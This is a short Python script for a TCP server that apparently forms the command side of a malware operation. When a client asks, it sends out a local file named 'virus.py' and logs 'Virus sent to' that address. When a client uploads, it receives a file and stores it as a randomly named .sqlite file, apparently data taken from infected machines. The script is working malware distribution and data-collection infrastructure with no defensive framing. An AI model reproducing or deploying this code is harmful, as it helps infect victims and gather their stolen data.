import socket
from uuid import uuid4

with open('virus.py', 'rb') as virus_code:
    code = virus_code.read()

sock = socket.socket()
sock.bind(('', 1488))
sock.listen(10)

try:
    while True:
        conn, addr = sock.accept()

        data = conn.recv(1024)
        if data == b'Download':
            conn.send(code)
            conn.close()
            print(f'Virus sent to {addr[0]}:{addr[1]}')

        elif data == b'Upload':
            filename = f'{uuid4()}.sqlite'
            with open(filename, 'wb') as f:
                while True:
                    file_chunk = conn.recv(1024)
                    if not file_chunk:
                        conn.close()
                        break
                    f.write(file_chunk)

                print(f'Received file from {addr[0]}:{addr[1]} | Name: {filename}')

        else:
            conn.close()

except KeyboardInterrupt:
    sock.close()
